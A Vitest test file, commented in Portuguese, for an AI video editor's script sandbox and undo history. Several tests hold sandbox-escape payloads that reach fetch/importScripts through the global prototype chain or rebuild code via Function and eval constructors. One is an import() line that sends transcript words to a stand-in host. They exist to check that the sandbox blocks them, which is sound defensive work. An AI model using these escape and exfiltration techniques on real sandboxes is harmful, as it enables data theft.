/* bugs da revisão r3 (IA): cada teste falhava antes da correção */
import vm from 'node:vm';
import { describe, expect, it, vi } from 'vitest';
import { applyOps, type EditOp } from '../ops';
import { createProject, makeVideoClip } from '../defaults';
import type { MediaAsset, Project } from '../types';
import { runSandboxed } from './script/sandbox';
import { runScript, scriptInput, workerSource } from './script/run';
import { finalizeClaude } from './finalize';
import { EditResponseSchema } from './schemas';
import { sanitizeOps } from './validate';
import { useEditor } from '../store';
import * as pipeline from './pipeline';
import { withSingleUndo } from './pipeline';
import { useAIChat } from './chatStore';
import { abortError } from './runGuard';

const src: MediaAsset = { id: 'a1', kind: 'video', role: 'source', name: 'b.mp4', mime: 'video/mp4', size: 1, duration: 20 };
const assets: Record<string, MediaAsset> = { a1: src };
const base = (): Project => applyOps(createProject(), [
  { op: 'add_clip', trackId: 'track_video_1', clip: { ...makeVideoClip(src, 0), id: 'c1', duration: 10 } },
] as EditOp[]).project;

/**
 * Sobe o código do Worker num contexto vm parecido com o escopo de um Worker: `fetch`/`importScripts`/
 * `postMessage` moram no PROTÓTIPO do global (como em WorkerGlobalScope.prototype) e anotam as chamadas.
 */
function bootWorker() {
  const ctx = vm.createContext({ __net: [] as string[], __posted: [] as unknown[] });
  vm.runInContext(`
    globalThis.self = globalThis;
    Object.setPrototypeOf(globalThis, {
      fetch(u) { __net.push('fetch ' + u); },
      importScripts(u) { __net.push('importScripts ' + u); },
      postMessage(d) { __posted.push(d); },
      setTimeout(f) { __net.push('setTimeout ' + typeof f); },
    });`, ctx);
  vm.runInContext(workerSource(), ctx);
  const run = (code: string) => {
    const before = (ctx.__posted as unknown[]).length;
    vm.runInContext('self.onmessage({ data: __msg })', Object.assign(ctx, { __msg: { code, input: scriptInput(base(), assets), maxOps: 3000 } }));
    return (ctx.__posted as unknown[]).slice(before);
  };
  return { run, net: ctx.__net as string[] };
}

/* acesso ao global sem citar `self`/`globalThis`: getter em Object.prototype lido como nome livre */
const GLOBAL = "Object.defineProperty(Object.prototype, 'zz', { get() { return this; }, configurable: true }); const g = zz; delete Object.prototype.zz;";

describe('run_script: o Worker não deixa o script sair para a rede', () => {
  it('fetch no protótipo do escopo global não sobra (antes: WorkerGlobalScope.prototype.fetch funcionava)', () => {
    const w = bootWorker();
    const out = w.run(`${GLOBAL} let o = g; while (o) { if (Object.prototype.hasOwnProperty.call(o, 'fetch') && typeof o.fetch === 'function') o.fetch.call(g, 'http://x/vazou'); if (Object.prototype.hasOwnProperty.call(o, 'importScripts') && o.importScripts) o.importScripts('http://x/s.js'); o = Object.getPrototypeOf(o); } ep.text({ text: 'ok', start: 0, duration: 1 });`);
    expect(w.net).toEqual([]);
    expect(out).toHaveLength(1);
    expect((out[0] as { ops: unknown[] }).ops).toHaveLength(1);
  });

  it('texto -> código some (Function, eval, setTimeout e os construtores de funções async/geradoras)', () => {
    const w = bootWorker();
    const cases = [
      `Function('return 1')`,
      `${GLOBAL} g.eval('1')`,
      `${GLOBAL} g.setTimeout('1', 0)`,
      `(async () => {}).constructor('return 1')`,
      `(function* () {}).constructor('yield 1')`,
      `(() => {}).constructor('return 1')`,
    ];
    for (const code of cases) {
      const [res] = w.run(code) as { error?: string }[];
      expect(res.error, code).toMatch(/not a function|is not defined|undefined/);
    }
    expect(w.net).toEqual([]);
  });

  it('import() é recusado (é sintaxe: nem o parâmetro sombreado nem o Worker conseguem tirar)', () => {
    const r = runSandboxed(`import('https://exemplo.com/x.js?d=' + JSON.stringify(ep.words())); return [];`, scriptInput(base(), assets));
    expect('error' in r && r.error).toMatch(/import não é permitido/);
    // texto com "importante" continua valendo
    const ok = runSandboxed(`ep.text({ text: 'O mais importante', start: 0, duration: 1 });`, scriptInput(base(), assets));
    expect('ops' in ok && ok.ops).toHaveLength(1);
  });

  it('o script não forja a resposta do Worker (postMessage capturado; resposta sem ops vira erro)', async () => {
    const w = bootWorker();
    const out = w.run(`${GLOBAL} if (g.postMessage) g.postMessage({ hello: 1 }); return [];`);
    expect(out).toEqual([{ ops: [], logs: [] }]);
    // e mesmo que algo chegue fora da forma, o runScript não quebra o finalize (r.ops.length em undefined)
    const fake = { onmessage: null as ((ev: MessageEvent) => void) | null, onerror: null, terminate() {}, postMessage() { setTimeout(() => this.onmessage?.({ data: { hello: 1 } } as MessageEvent), 0); } };
    const r = await runScript('return []', base(), assets, { makeWorker: () => fake });
    expect('error' in r && r.error).toMatch(/inválida/);
  });
});

describe('withSingleUndo: edição manual que parou a IA não é engolida pelo passo de desfazer da IA', () => {
  const vol = (id: string) => (useEditor.getState().project.tracks.flatMap((t) => t.clips).find((c) => c.id === id) as { volume: number }).volume;
  const two = () => applyOps(base(), [{ op: 'add_clip', trackId: 'track_video_1', clip: { ...makeVideoClip(src, 10), id: 'c2', duration: 10, in: 10 } }] as EditOp[]).project;

  it('o 1º desfazer volta só a edição manual; o 2º volta a IA inteira (1 passo)', async () => {
    useEditor.setState({ project: two(), past: [], future: [], assets, messages: [], live: { running: false, done: 0, total: 0 } });
    await withSingleUndo(async () => {
      await useEditor.getState().applyLive([{ op: 'update_clip', clipId: 'c1', patch: { volume: 0.3 }, explain: 'a' }], { delayMs: 0 });
      await useEditor.getState().applyLive([{ op: 'update_clip', clipId: 'c1', patch: { volume: 0.4 }, explain: 'b' }], { delayMs: 0 });
      // o usuário mexe no projeto entre os lotes -> a execução é parada (AbortError)
      useEditor.getState().dispatch({ op: 'update_clip', clipId: 'c2', patch: { volume: 0.9 } });
      throw abortError('Edição parada');
    }).catch(() => {});
    expect([vol('c1'), vol('c2')]).toEqual([0.4, 0.9]);
    useEditor.getState().undo();
    expect([vol('c1'), vol('c2')]).toEqual([0.4, 1]); // antes: [1, 1] — o desfazer apagava a IA junto
    useEditor.getState().undo();
    expect([vol('c1'), vol('c2')]).toEqual([1, 1]);
  });

  it('chat: execução parada por edição manual não oferece "Desfazer esta edição" (ele desfaria a edição do usuário junto)', async () => {
    useEditor.setState({ project: two(), past: [], future: [], assets, messages: [], live: { running: false, done: 0, total: 0 } });
    useAIChat.setState({ status: { configured: false, provider: 'demo' } as never, fast: true, busy: false });
    const spy = vi.spyOn(pipeline, 'chatEdit').mockImplementation(async (_t, o) => pipeline.withSingleUndo(async () => {
      await o!.apply!([{ op: 'update_clip', clipId: 'c1', patch: { volume: 0.3 }, explain: 'a' }], { delayMs: 0 });
      await new Promise((r) => setTimeout(r, 30));
      await o!.apply!([{ op: 'update_clip', clipId: 'c1', patch: { volume: 0.4 }, explain: 'b' }], { delayMs: 0 });
      return { reply: 'ok', ops: [], appliedIds: [], provider: 'demo', warnings: [] };
    }));
    const run = useAIChat.getState().send('x');
    await new Promise((r) => setTimeout(r, 10));
    useEditor.getState().dispatch({ op: 'update_clip', clipId: 'c2', patch: { volume: 0.9 } });
    await run;
    spy.mockRestore();
    const msg = [...useEditor.getState().messages].reverse().find((m) => m.role === 'assistant')!;
    expect(msg.text).toMatch(/Parei a edição/);
    useAIChat.getState().undoRun(msg.id);
    expect([vol('c1'), vol('c2')]).toEqual([0.3, 0.9]); // antes: [1, 1] — a edição do usuário sumia
    useEditor.getState().undo();
    expect([vol('c1'), vol('c2')]).toEqual([0.3, 1]);
  });

  it('sem edição manual continua juntando todos os lotes num passo só', async () => {
    useEditor.setState({ project: two(), past: [], future: [], assets, messages: [], live: { running: false, done: 0, total: 0 } });
    await withSingleUndo(async () => {
      await useEditor.getState().applyLive([{ op: 'update_clip', clipId: 'c1', patch: { volume: 0.3 }, explain: 'a' }], { delayMs: 0 });
      await useEditor.getState().applyLive([{ op: 'update_clip', clipId: 'c2', patch: { volume: 0.4 }, explain: 'b' }], { delayMs: 0 });
    });
    useEditor.getState().undo();
    expect([vol('c1'), vol('c2')]).toEqual([1, 1]);
  });
});

describe('add_graphic: campos do prompt existem no schema da saída estruturada', () => {
  it('keyframes do gráfico (prompt: "add_graphic {…, keyframes?}") não somem no parse do schema', () => {
    const kf = [{ t: 0, transform: { scale: 0.2 }, easing: 'easeOut' }, { t: 1, transform: { scale: 0.4 }, easing: 'easeOut' }];
    const raw = EditResponseSchema.parse({ reply: 'ok', ops: [{ op: 'add_graphic', explain: 'Selo', svg: '<svg viewBox="0 0 10 10"/>', name: 'Selo', start: 0, duration: 2, keyframes: kf }] });
    expect((raw.ops[0] as Record<string, unknown>).keyframes).toEqual(kf);
    const d = sanitizeOps(raw.ops, base(), assets).deferred[0];
    expect(d.kind === 'graphic' && d.clip.keyframes).toEqual(kf);
  });
});

describe('update_graphic: redesenhar um gráfico entra no desfazer', () => {
  const g1: MediaAsset = { id: 'g1', kind: 'image', role: 'graphic', name: 'Seta.png', mime: 'image/png', size: 10, duration: 0, width: 1920, height: 1920, url: 'blob:g1', svg: '<svg viewBox="0 0 10 10"><path d="M0 0" fill="red"/></svg>' };
  const g2: MediaAsset = { ...g1, id: 'g2', url: 'blob:g2', svg: '<svg viewBox="0 0 10 10"><path d="M0 0" fill="blue"/></svg>' };
  const withGraphic = () => applyOps(base(), [
    { op: 'add_clip', trackId: 'track_gfx', clip: { id: 'img1', type: 'image', assetId: 'g1', start: 1, duration: 3, transform: { x: 0, y: 0, scale: 0.4, rotation: 0, opacity: 1 }, fit: 'contain' } },
  ] as EditOp[]).project;
  const imgAsset = () => (useEditor.getState().project.tracks.flatMap((t) => t.clips).find((c) => c.id === 'img1') as { assetId: string }).assetId;

  it('gera ops (o clipe passa para o gráfico novo) em vez de trocar a imagem por fora do histórico', async () => {
    const all: Record<string, MediaAsset> = { ...assets, g1 };
    let inPlace = 0;
    const f = await finalizeClaude({ reply: 'azul', ops: [], deferred: [{ kind: 'update_graphic', assetId: 'g1', svg: g2.svg! }] }, withGraphic(), {
      userText: 'deixa a seta azul', getAssets: () => all,
      createGraphic: async () => { all.g2 = g2; return g2; },
      updateGraphic: async () => { inPlace++; },
    });
    expect(f.errors).toEqual([]);
    expect(inPlace).toBe(0);
    expect(f.ops).toHaveLength(1);
    expect(f.ops[0]).toMatchObject({ op: 'update_clip', clipId: 'img1', patch: { assetId: 'g2' } });
    // desfazer = voltar ao projeto de antes: o clipe aponta de novo para o gráfico antigo (que ficou intacto)
    useEditor.setState({ project: withGraphic(), past: [], future: [], assets: all });
    useEditor.getState().dispatch(f.ops);
    expect(imgAsset()).toBe('g2');
    useEditor.getState().undo();
    expect(imgAsset()).toBe('g1');
    expect(all.g1.svg).toBe(g1.svg);
  });

  it('gráfico que não está em nenhum clipe: redesenha no lugar (como antes)', async () => {
    let inPlace = 0;
    const f = await finalizeClaude({ reply: 'azul', ops: [], deferred: [{ kind: 'update_graphic', assetId: 'g1', svg: g2.svg! }] }, base(), {
      userText: 'x', getAssets: () => ({ ...assets, g1 }), createGraphic: async () => g2, updateGraphic: async () => { inPlace++; },
    });
    expect(inPlace).toBe(1);
    expect(f.ops).toEqual([]);
  });
});
